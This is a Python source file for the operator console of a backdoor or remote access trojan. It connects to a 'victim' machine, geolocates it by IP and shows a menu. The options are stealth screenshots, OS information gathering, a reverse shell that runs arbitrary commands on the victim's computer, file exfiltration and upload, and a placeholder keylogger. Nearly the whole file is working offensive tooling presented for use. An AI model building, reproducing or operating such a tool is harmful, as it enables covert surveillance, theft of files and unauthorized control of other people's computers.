# -*- coding: utf-8 -*
import socket
import os
import platform
import time
import encrypted_connection
import datetime
import geolocalisation
import threading
import argparse
import logging
HOST = '0.0.0.0'  # Set as every ip address can connect to the server.
PORT = 6969  # Set listening port.
defaultPath = None
if platform.system() == "Windows":
    arrowSymbol = ""
else:
    arrowSymbol = "↴"

# When called, clear the console. If called with True argument, wait for enter to continue.
def consoleCleaner(enterToContinue):
    if enterToContinue == True:
        try:
            input("Press enter to continue")
        except SyntaxError:
            pass
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')


def welcomme():  # Message to welcomme the user,called once at the MAIN LOOP start.
    print("       ___         ___   ___         ___         ___   ___         ___         ___         ___  \r")
    print("|   | |     |     |     |   | |\ /| |             |   |   |       |           |   | |\  | |     \r")
    print("| + | |-+-  |     |     |   | | + | |-+-          +   |   |       |-+-        |   | | + | |-+-  \r")
    print("|/ \| |     |     |     |   | |   | |             |   |   |       |           |   | |  \| |     \r")
    print("       ---   ---   ---   ---         ---               ---                -    ---         ---  \r")
    print("                                                                                                ")


def menu(menu):  # Contain the menus used in the main loop (Main or Keylooger).
    if (menu == "principale"):
        print("+--------------------------+\n"
              "|         Menu             |\n"
              "+--------------------------+\n"
              "| 1. Screen that beach     |\n"
              "| 2. Os infos              |\n"
              "| 3. Reverse shell         |\n"
              "| 4. Expert Mode           |\n"
              "| 5. Upload file           |\n"
              "| 99. Exit                 |\n"
              "+--------------------------+")
    if (menu == "uploadfile"):
        if len(defaultPath) < len(currentDirectory):
            taille = len(currentDirectory) + 25
        else:
            taille = len(defaultPath) + 25
        print("+"+taille*"-"+"+\n"
              "[*] File uploaded to : " + defaultPath + "\n"
              "+"+taille*"-"+"+\n"
              "[1] Modify Attacker path : " + currentDirectory+"\n"
              "[2] Modify Chosen file : " + chosenFile + "\n"
              "[3] Upload the file\n"
              "[99] Go back to main menu\n"
              "+"+taille*"-"+"+\n")


def uploadFileMenu():
    global pathToUpload
    global currentDirectory
    global chosenFile
    pathToUpload = defaultPath
    currentDirectory = os.getcwd()
    chosenFile = "Unknown"
    menu("uploadfile")
    choice = input("> ")
    while choice != "99":
        logging.info("Upload file Menu # choice : %s", choice)
        consoleCleaner(False)
        if choice == "1":
            print("[*] Current attacker path: " + currentDirectory+"\n")
            newPath = input("Enter the new path : ")
            while True:
                if os.path.isdir(choice):
                    currentDirectory = newPath
                    print("Path has been changed to : " + newPath)
                    time.sleep(1)
                    break
                elif newPath == "quit":
                    break
                else:
                    print("Path doesn't exist")
                    time.sleep(1)
                consoleCleaner(False)
                print("[*] Current attacker path: " + currentDirectory+"\n")
                newPath = input("Enter the new path : ")
            logging.info("Upload file Menu # path changed to : %s", newPath)
            consoleCleaner(False)
        if choice == "2":
            i = 1
            fileString = ""
            while True:
                print("PICK A FILE BY HIS NAME : \n\n")
                fileList = os.listdir(currentDirectory)
                print("┌------ " + currentDirectory)
                for files in fileList:
                    fileString += "|-- ["+str(i) + "] " + files + "\n"
                    i += 1
                print(fileString + "└-- ["+str(i) + "] Leave.")
                fileChoiceNum = input("> ")
                if int(fileChoiceNum) != (len(fileList) + 1):
                    fileChoicePath = fileList[int(fileChoiceNum)-1]
                    if os.path.isfile(currentDirectory+"/"+fileChoicePath):
                        print("File has been set to : " + fileChoicePath)
                        chosenFile = fileChoicePath
                        logging.info(
                            "Upload file Menu # chosen file: %s", chosenFile)
                        time.sleep(1)
                        consoleCleaner(False)
                        break
                    else:
                        print("Path or file doesn't exist")
                        logging.info("Upload file Menu # Path doesn't exist")
                else:
                    consoleCleaner(False)
                    break
        if choice == "3":
            if chosenFile != "Unknown":
                try:
                    uploadFile(currentDirectory, chosenFile)
                    logging.info("Upload file Menu # Uploading the file")
                    print("File has been uploaded !")
                    consoleCleaner(True)
                except:
                    print("Upload failed !")
                    logging.info("Upload file Menu # Uploading failed")
                    consoleCleaner(True)
            else:
                print("Choose a file before uploading !")
                logging.info(
                    "Upload file Menu # No file has been choose before uploading")
                consoleCleaner(True)
        menu("uploadfile")
        choice = input(">")
    consoleCleaner(False)


def selection(menu, choice):  # Switch case, to dispatch menu possibilities.
    if menu == "principale":
        if choice == "1":
            print("Let's see that screen !")
            logging.info("Taking a screenshot")
            screenThatbeach()
            return True
        elif choice == "2":
            print("Hum, let's discover !")
            logging.info("Showing os infos")
            print("\n\n" + OsVictimInfos + "\n\n")
            consoleCleaner(True)
            return True
        elif choice == "3":
            print("Good choice, let's get in !")
            logging.info("Entering to the reverse shell")
            time.sleep(1)
            consoleCleaner(False)
            reverseShell(False, False)
            return True
        elif choice == "4":
            print("Let's go deeper !")
            logging.info("Entering to the expert mode")
            time.sleep(1)
            consoleCleaner(False)
            reverseShell(True, True)
            return True
        elif choice == "5":
            print("Let's upload some files !")
            logging.info("Entering to the upload menu")
            time.sleep(1)
            consoleCleaner(False)
            uploadFileMenu()
            return True
        elif choice == "99":
            print("Exit mode :\n"
                  "[1] Exit client\n"
                  "[2] Exit client & server\n")
            choice = input("> ")
            while True:
                if choice == "1":
                    logging.info("Exiting the client")
                    ClientThreadVar.stop()
                    ClientThreadVar.join()
                    break
                elif choice == "2":
                    logging.info("Exiting the client & server")
                    ClientThreadVar.Quit()
                    ClientThreadVar.join()
                    break
                else:
                    print("Bad choice, try again !")
                    time.sleep(1)
                    consoleCleaner(False)
                print("Exit mode :\n"
                      "[1] Exit client\n"
                      "[2] Exit client & server\n")
                choice = input("> ")
            print("\nSee you later !")
            encrypter.send_message_server("exit")
            time.sleep(1.5)
            consoleCleaner(False)
            return False
        else:
            print("Bad choice, try again !")
            time.sleep(1)
            consoleCleaner(False)
            return True


# If chosen, open a shell that interact with victim's pc.
def reverseShell(screenThatbeachAcces, keyLogger):
    global defaultPath
    encrypter.send_message_server("cd " + defaultPath)
    encrypter.receive_message_server()
    client_path = defaultPath
    while True:
        command = input(client_path + " > ")
        logging.info("Reverse shell # command > %s", command)
        if((command == "stb") & (screenThatbeachAcces == False)):
            print("Acces forbidden")
        elif((command == "stb") & (screenThatbeachAcces == True)):
            print("taking the screenshot")
            screenThatbeach()
        elif("dl" in command):
            try:
                command_split = command.split()
                downloadFile(command_split[1])
            except:
                print("No file name !")
        elif("upload" in command):
            currentDirectory = os.getcwd()
            try:
                command_split = command.split()
                if command_split[1] == "?":
                    i = 1
                    fileList = os.listdir(currentDirectory)
                    fileString = ""
                    print("┌------ " + currentDirectory)

                    for files in fileList:
                        if i == (len(fileList)):
                            fileString += "└-- " + files + "\n"
                        else:
                            fileString += "|-- " + files + "\n"
                        i += 1
                    print(fileString)
                else:
                    uploadFile(currentDirectory, command_split[1])
            except:
                print("No file name !")
        elif((command == "keylogger") & (keyLogger == False)):
            print("Acces forbidden")
        elif((command == "keylogger") & (keyLogger == True)):
            print("Not available now !")
            # client_socket.send(command.encode("utf-8"))
        elif(command == "state"):
            print(OsVictimInfos)
        elif(command == "home"):
            encrypter.send_message_server("cd " + defaultPath)
            client_path = defaultPath
            encrypter.receive_message_server()
        elif(command == "clear"):
            consoleCleaner(False)
        elif(command == "quit"):
            encrypter.dump_buffer()
            consoleCleaner(False)
            break
        else:
            try:
                if(len(command.split()) != 0):
                    encrypter.send_message_server(command)
                    message = encrypter.receive_message_server()
                    if "Directory : " in str(message):
                        try:
                            useless, client_path = message.split(" : ")
                        except:
                            print("No path has been sent.")
                    else:
                        print(message)
                else:
                    print("continue")
                    continue
            except(EOFError):
                print(
                    "Invalid input, type 'help' to get a list of implemented commands.\n")
                continue


# If chosen, take a stealth screenshot of the victim and save it in the .py executed path.
def screenThatbeach():
    encrypter.send_message_server("stb")
    captureName = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
    path = "captures"
    try:
        logging.info("Downloading the screenshot")
        if encrypter.DownloadFile(path, captureName):
            logging.info("Download sucessful")
            print("Download sucessful.")
            os.system("qlmanage -p " + path + "/" +
                      captureName + ">/dev/null 2>&1")
            consoleCleaner(False)
        else:
            logging.warning("Failed to download, due to missing permissions")
            print("You do not have permissions to create a file there.")
    except:
        logging.warning("Problem in definition")
        print("Problem in definition.")
        consoleCleaner(True)


# Download a selected file on victim's pc and save it in downloaded_files
def downloadFile(fileName: str):
    encrypter.send_message_server("dl " + fileName)
    path = "downloaded_files"
    try:
        logging.info("Downloading %s", fileName)
        if encrypter.DownloadFile(path, fileName):
            logging.info("Download sucessful")
            print("Download sucessful.")
            os.system("qlmanage -p " + path + "/" +
                      fileName + ">/dev/null 2>&1")
            consoleCleaner(False)
        else:
            logging.warning(
                "Download failed, the file you tried to download doesn't exist")
            print("The file you want to download doesn't exist !")
    except:
        logging.warning("Problem in definition")
        print("Problem in definition.")
        consoleCleaner(True)


# Upload a file from attacker pc to default the default victim's path
def uploadFile(pathOfFile: str, fileToUpload: str):
    encrypter.send_message_server("upload " + fileToUpload)
    logging.info("Trying to upload %s", fileToUpload)
    encrypter.UploadFile(fileToUpload)


# Return the victim's user name and set the default path.
def findUser(tupleArray: tuple):
    global defaultPath
    tupleArray = tupleArray.split("\n")
    useless, arg = tupleArray[3].split(" : ")
    useless, defaultPath = tupleArray[4].split(" : ")
    return arg


def check_arg(args=None):  # Argparser that let the user use 2 arguments. /!\See the documentation/!\
    parser = argparse.ArgumentParser(
        description='F_ONE BECAUSE IT IS LITTERALLY THE FIRST ONE')
    parser.add_argument('-H', '--host',
                        help='host ip',
                        default='localhost')
    parser.add_argument('-p', '--port',
                        help='port of the web server',
                        default='6970')

    results = parser.parse_args(args)
    return (results.host,
            results.port)


# Thread that connect to the listening victim's pc and wake client on victim's pc
class ClientThread(threading.Thread):
    def __init__(self, HostClient: str, PortClient: int, PortServer: int):
        super().__init__()
        self.stop_thread = False
        self.HOSTCLIENT = HostClient
        self.PORTCLIENT = PortClient
        self.PORTSERVER = PortServer

    def run(self):
        global clientConnexion
        try:
            clientConnexion = encrypted_connection.client(b"d41d8cd98f00b205")
            clientConnexion.initialize_tcp_connexion_client(
                self.HOSTCLIENT, self.PORTCLIENT)
        except:
            logging.warning("Victim's server is not alive !")
            self.stop_thread = True
        logging.info("Connected to victim's server")
        if not self.stop_thread:
            command = clientConnexion.receive_message_client()
            logging.info("Victim is online")
            if command == "online":
                clientConnexion.send_message_client(str(self.PORTSERVER))
                logging.info(
                    "Waking up victim's client to connect on the server")
                clientConnexion.send_message_client("wake")
            while not self.stop_thread:
                pass
            print("Send shutdown to client")
            logging.info("The client is being shutted down")
            clientConnexion.send_message_client("shutdown")
            time.sleep(1)
            logging.info("Closing tcp client connexion")
            clientConnexion.close_tcp_connexion_client()

    def Quit(self):
        clientConnexion.send_message_client("quit")
        self.stop_thread = True

    def stop(self):
        self.stop_thread = True


# STARTING MAIN LOOP.
logging.basicConfig(filename="Server.log",
                    level=logging.DEBUG,
                    format="%(asctime)s - %(name)s - %(threadName)s -  %(levelname)s - %(message)s")
with open("Server.log", "a") as file:
    file.write("\n\n"+100*"-" + "\n\n\n")
# Getting the client ip and client port from argparser.
hostClient, portClient = check_arg()
logging.info("Credentials from argpars -> ip : %s | port : %s",
             hostClient, portClient)
# Initializing variable with the ClientThread class and filling the case with previous ip and port.
ClientThreadVar = ClientThread(str(hostClient), int(portClient), int(PORT))
# Staring the thread, and connection to the victim's Server.
logging.info("Starting Client Thread")
ClientThreadVar.start()
# Calling the function to set the secret key
encrypter = encrypted_connection.server(b"d41d8cd98f00b205")
logging.info("Waiting for the victim to connect on our server")
# Calling the function to create the TCP server with specified PORT & HOST.
client_ip = encrypter.initialize_tcp_connexion_server(HOST, PORT)
logging.info("The victim is connected with the following ip : %s", client_ip)
# Call geolocalisation class to try geolocating approximately the victim with his ip.
logging.info("Trying to geolocating the victim")
victimLocalisation = geolocalisation.GeoLocalisation(client_ip).locate()
logging.info("Victim is connected from : %s", victimLocalisation)
consoleCleaner(False)
# Getting victim's os infos.
logging.info("Getting os victim infos")
OsVictimInfos = encrypter.receive_message_server()
logging.info("Os victim infos "+arrowSymbol+"\n%s", OsVictimInfos)
# Set the variable defaultpath with victim's default path, and extract the user name.
user = findUser(OsVictimInfos)

# Create a variable that is used to exit from the loop.
exitBackDoorLoop = True
if OsVictimInfos == "exit":
    logging.warning("The symmetric key is different from the victim")
    exitBackDoorLoop = False

# Starting the main loop and waiting for exitBackDoorLoop to change to False.
logging.info("Entering in the main loop")
while exitBackDoorLoop:
    # Show the banner.
    welcomme()
    print("[*] " + user + " connected from " + client_ip + "\n")
    print("[*] Localisation : " + victimLocalisation + "\n")
    print("[*] Default path : " + defaultPath + "\n")
    menu("principale")
    exitBackDoorLoop = selection("principale", input("> "))
# Close the server tcp connexion
logging.info("Closing tcp server connexion")
encrypter.close_tcp_connexion_server()
